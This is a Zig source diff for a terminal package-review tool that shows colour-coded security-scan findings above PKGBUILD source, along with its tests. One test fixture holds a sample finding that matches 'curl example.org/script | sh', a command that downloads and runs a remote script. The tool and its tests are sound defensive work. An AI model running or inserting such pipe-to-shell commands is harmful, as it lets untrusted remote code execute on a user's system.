@@ -45,7 +45,7 @@ pub const Document = struct {
         lines: std.ArrayList([]const u8) = .empty,
         metadata: std.ArrayList(Metadata) = .empty,
     };
-    const Metadata = struct { kind: highlight.Kind, prefix: usize = 0, reset: bool = false };
+    const Metadata = struct { kind: highlight.Kind, prefix: usize = 0, reset: bool = false, style: ?vaxis.Style = null };
     fn append(alloc: std.mem.Allocator, builder: *Builder, text: []const u8, metadata: Metadata) !void {
         try builder.lines.append(alloc, text);
         try builder.metadata.append(alloc, metadata);
@@ -58,7 +58,12 @@ pub const Document = struct {
         var budget: usize = 200_000;
         for (lines, builder.metadata.items, rows) |text, metadata, *item| {
             if (metadata.reset) state = .{};
-            item.* = .{ .prefix = metadata.prefix, .spans = try highlight.highlight(alloc, text, metadata.prefix, metadata.kind, &state, &budget) };
+            const spans = if (metadata.style) |style| blk: {
+                const styled = try alloc.alloc(vxfw.RichText.TextSpan, 1);
+                styled[0] = .{ .text = text, .style = style };
+                break :blk styled;
+            } else try highlight.highlight(alloc, text, metadata.prefix, metadata.kind, &state, &budget);
+            item.* = .{ .prefix = metadata.prefix, .spans = spans };
         }
         return .{ .arena = arena.*, .lines = lines, .rows = rows };
     }
@@ -102,6 +107,7 @@ pub const Document = struct {
         var remaining: usize = 2 * 1024 * 1024;
         switch (question) {
             .pkgbuild => |review| {
+                try scanReview(alloc, &lines, review.warnings, review.scan_reported, &remaining);
                 // Install reviews show source; upgrades show CLI-computed changes.
                 if (action == .upgrade and review.diff_lines.len > 0) {
                     var diff_size: usize = 0;
@@ -116,13 +122,6 @@ pub const Document = struct {
                     if (action == .upgrade and review.old_pkgbuild.len > 0)
                         try section(alloc, &lines, "No diff supplied; showing the proposed PKGBUILD.", &remaining);
                     try sourceStyled(alloc, &lines, review.new_pkgbuild, &remaining, .shell);
-                }
-                if (review.warnings.len > 0) try section(alloc, &lines, "Findings", &remaining);
-                for (review.warnings) |warning| {
-                    const text = try std.fmt.allocPrint(alloc, "[{s}] {s} / {s}: {s}\n{s}", .{
-                        warning.Severity, warning.Tool, warning.Hook, warning.Message, warning.MatchedLine,
-                    });
-                    try source(alloc, &lines, text, &remaining);
                 }
                 for (review.source_files) |file| {
                     try section(alloc, &lines, file.name, &remaining);
@@ -197,6 +196,35 @@ pub const Document = struct {
         try append(alloc, lines, "", .{ .kind = .heading });
         const safe = try displayText(alloc, title, remaining);
         try append(alloc, lines, try std.fmt.allocPrint(alloc, "── {s} ──", .{safe}), .{ .kind = .heading });
+    }
+
+    fn findingStyle(severity: []const u8) vaxis.Style {
+        return .{ .bold = true, .fg = .{ .index = if (std.ascii.eqlIgnoreCase(severity, "Critical")) @as(u8, 1) else if (std.ascii.eqlIgnoreCase(severity, "Info")) @as(u8, 6) else @as(u8, 3) } };
+    }
+
+    fn scanReview(alloc: Allocator, lines: *Builder, warnings: []const operation.Warning, reported: bool, remaining: *usize) !void {
+        var critical: usize = 0;
+        var has_warning = false;
+        for (warnings) |finding| {
+            if (std.ascii.eqlIgnoreCase(finding.Severity, "Critical")) critical += 1 else if (!std.ascii.eqlIgnoreCase(finding.Severity, "Info")) has_warning = true;
+        }
+        const summary = if (warnings.len > 0)
+            if (critical > 0) try std.fmt.allocPrint(alloc, "Security scan: {d} finding{s}, {d} critical.", .{ warnings.len, if (warnings.len == 1) "" else "s", critical }) else try std.fmt.allocPrint(alloc, "Security scan: {d} finding{s}.", .{ warnings.len, if (warnings.len == 1) "" else "s" })
+        else if (reported) "Security scan: no findings reported by the CLI." else "Security scan: results not supplied by the CLI.";
+        const style: vaxis.Style = if (warnings.len > 0) findingStyle(if (critical > 0) "Critical" else if (has_warning) "Warning" else "Info") else .{ .fg = .{ .index = if (reported) @as(u8, 2) else @as(u8, 250) }, .bold = true };
+        try append(alloc, lines, try displayText(alloc, summary, remaining), .{ .kind = .plain, .style = style });
+        for (warnings) |finding| {
+            try append(alloc, lines, "", .{ .kind = .plain });
+            const title = try std.fmt.allocPrint(alloc, "[{s}] {s} — {s}", .{
+                if (finding.Severity.len > 0) finding.Severity else "Finding",
+                if (finding.Tool.len > 0) finding.Tool else "Scanner",
+                if (finding.Hook.len > 0) finding.Hook else "PKGBUILD",
+            });
+            try append(alloc, lines, try displayText(alloc, title, remaining), .{ .kind = .plain, .style = findingStyle(finding.Severity) });
+            if (finding.Message.len > 0) try prose(alloc, lines, finding.Message, remaining);
+            if (finding.MatchedLine.len > 0) try prose(alloc, lines, try std.fmt.allocPrint(alloc, "Matched: {s}", .{finding.MatchedLine}), remaining);
+        }
+        try append(alloc, lines, "", .{ .kind = .plain });
     }
 
     fn prose(alloc: std.mem.Allocator, lines: *Builder, text: []const u8, remaining: *usize) !void {
@@ -597,8 +625,8 @@ test "PKGBUILD review selects diff or full source without repeating revisions" {
     try std.testing.expect(std.mem.indexOf(u8, diff_text, "new_only") == null);
     var install = try Document.fromQuestionForAction(std.testing.allocator, review, .install);
     defer install.deinit();
-    try std.testing.expectEqual(@as(usize, 1), install.lines.len);
-    try std.testing.expect(std.mem.endsWith(u8, install.lines[0], "new_only=2"));
+    try std.testing.expectEqual(@as(usize, 3), install.lines.len);
+    try std.testing.expect(std.mem.endsWith(u8, install.lines[2], "new_only=2"));
     review.pkgbuild.old_pkgbuild = "";
     var fresh = try Document.fromQuestion(std.testing.allocator, review);
     defer fresh.deinit();
@@ -676,4 +704,59 @@ pub fn drawChoice(ptr: *anyopaque, ctx: vxfw.DrawContext) Allocator.Error!vxfw.S
     const rich = try ctx.arena.create(vxfw.RichText);
     rich.* = .{ .text = spans, .softwrap = true };
     return rich.draw(ctx.withConstraints(.{ .width = width }, .{ .width = width, .height = null }));
+}
+
+test "install review presents owned colored scan findings before source and keeps attachments" {
+    var message = try operation.decodeJson(std.testing.allocator,
+        \\{"$kind":"q.pkgbuilddiff","QuestionId":"301","PackageName":"demo","OldPkgbuild":"","NewPkgbuild":"pkgname=demo","Warnings":[{"Tool":"script-scan","Severity":"Critical","Hook":"post_install","Message":"Downloads and executes a script","MatchedLine":"curl example.org/script | sh"},{"Tool":"homograph","Severity":"Warning","Hook":"build","Message":"Confusable character","MatchedLine":"printf \u001b[31m"}],"SourceFiles":{"demo.install":"post_install() { echo review; }"}}
+    );
+    var document = try Document.fromQuestionForAction(std.testing.allocator, message.value.question, .install);
+    defer document.deinit();
+    message.deinit(); // The review document owns every displayed field.
+    try std.testing.expectEqualStrings("Security scan: 2 findings, 1 critical.", document.lines[0]);
+    try std.testing.expectEqual(@as(u8, 1), document.rows[0].spans[0].style.fg.index);
+    const text = try std.mem.join(std.testing.allocator, "\n", document.lines);
+    defer std.testing.allocator.free(text);
+    const finding = std.mem.indexOf(u8, text, "Downloads and executes a script").?;
+    const source = std.mem.indexOf(u8, text, "pkgname=demo").?;
+    try std.testing.expect(finding < source);
+    try std.testing.expect(std.mem.indexOf(u8, text, "Matched: curl example.org/script | sh") != null);
+    try std.testing.expect(std.mem.indexOf(u8, text, "demo.install") != null);
+    try std.testing.expect(std.mem.indexOf(u8, text, "\\x1b[31m") != null);
+    try std.testing.expect(std.mem.indexOfScalar(u8, text, 0x1b) == null);
+    var critical = false;
+    var warning = false;
+    for (document.lines, document.rows) |line, item| {
+        if (std.mem.startsWith(u8, line, "[Critical] script-scan")) critical = item.spans[0].style.fg.index == 1;
+        if (std.mem.startsWith(u8, line, "[Warning] homograph")) warning = item.spans[0].style.fg.index == 3;
+    }
+    try std.testing.expect(critical and warning);
+    vxfw.DrawContext.init(.unicode);
+    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
+    defer arena.deinit();
+    const surface = try row(&document, 0).?.draw(.{ .arena = arena.allocator(), .min = .{ .width = 24 }, .max = .{}, .cell_size = .{ .width = 10, .height = 20 } });
+    try std.testing.expect(surface.size.height > 1);
+    try std.testing.expectEqual(@as(u8, 1), surface.buffer[24].style.fg.index);
+}
+
+test "review distinguishes no findings from unavailable scans without adding scan status to previews" {
+    var question: operation.Question = .{ .pkgbuild = .{ .question_id = "1", .package_name = "demo", .old_pkgbuild = "", .new_pkgbuild = "pkgname=demo", .scan_reported = true } };
+    var clean = try Document.fromQuestionForAction(std.testing.allocator, question, .install);
+    defer clean.deinit();
+    try std.testing.expectEqualStrings("Security scan: no findings reported by the CLI.", clean.lines[0]);
+    question.pkgbuild.scan_reported = false;
+    var missing = try Document.fromQuestionForAction(std.testing.allocator, question, .install);
+    defer missing.deinit();
+    try std.testing.expectEqualStrings("Security scan: results not supplied by the CLI.", missing.lines[0]);
+    for ([_][]const u8{ "Info", "Unrecognized" }, [_]u8{ 6, 3 }) |severity, color| {
+        const warnings = [_]operation.Warning{.{ .Severity = severity, .Message = "Preserve this finding" }};
+        question.pkgbuild.warnings = &warnings;
+        var findings = try Document.fromQuestionForAction(std.testing.allocator, question, .install);
+        defer findings.deinit();
+        try std.testing.expectEqual(color, findings.rows[0].spans[0].style.fg.index);
+    }
+    var preview = try Document.init(std.testing.allocator, &.{.{ .Name = "demo", .PkgBuild = "pkgname=demo" }});
+    defer preview.deinit();
+    try std.testing.expectEqual(@as(usize, 1), preview.lines.len);
+    try std.testing.expect(std.mem.startsWith(u8, preview.lines[0], "    1"));
 }
